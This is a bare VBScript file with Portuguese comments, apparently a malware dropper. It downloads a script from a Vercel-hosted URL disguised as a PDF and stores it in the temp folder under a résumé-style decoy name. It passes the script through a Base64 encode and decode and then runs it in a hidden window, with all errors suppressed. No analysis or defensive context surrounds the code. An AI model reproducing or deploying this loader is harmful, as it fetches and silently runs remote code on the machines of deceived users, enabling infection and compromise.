On Error Resume Next

Dim url, tempFolder, vbsOriginal, base64File, vbsDecoded, shell
Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")
tempFolder = fso.GetSpecialFolder(2)

url = "https://testando123-blond.vercel.app/Documento0001.pdf-.vbs"
vbsOriginal = tempFolder & "\original.vbs"
base64File = tempFolder & "\isabella-curriculo.txt"
vbsDecoded = tempFolder & "\executar.vbs"

' Baixar o VBS da internet
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", url, False
http.Send

If http.Status = 200 Then
    Set f = fso.CreateTextFile(vbsOriginal, True)
    f.Write http.responseText
    f.Close
Else
    MsgBox "❌ Erro ao baixar o VBS: " & http.Status
    WScript.Quit
End If

' Codificar o VBS em Base64
Set input = fso.OpenTextFile(vbsOriginal, 1)
Set stream = CreateObject("ADODB.Stream")
stream.Type = 2
stream.Charset = "utf-8"
stream.Open
stream.WriteText input.ReadAll
stream.Position = 0
stream.Type = 1
bin = stream.Read
stream.Close

Set xml = CreateObject("Msxml2.DOMDocument.3.0")
Set node = xml.createElement("b64")
node.dataType = "bin.base64"
node.nodeTypedValue = bin

Set output = fso.CreateTextFile(base64File, True)
output.Write node.text
output.Close

' Decodificar e executar
Set txt = fso.OpenTextFile(base64File, 1)
b64 = txt.ReadAll
txt.Close

Set xml2 = CreateObject("Msxml2.DOMDocument.3.0")
Set n2 = xml2.createElement("d")
n2.dataType = "bin.base64"
n2.Text = b64

Set stream2 = CreateObject("ADODB.Stream")
stream2.Type = 1
stream2.Open
stream2.Write n2.nodeTypedValue
stream2.Position = 0
stream2.Type = 2
stream2.Charset = "utf-8"
code = stream2.ReadText
stream2.Close

' Salvar código decodificado
Set execFile = fso.CreateTextFile(vbsDecoded, True)
execFile.Write code
execFile.Close

' Executar de forma oculta
shell.Run "wscript.exe """ & vbsDecoded & """", 0, False
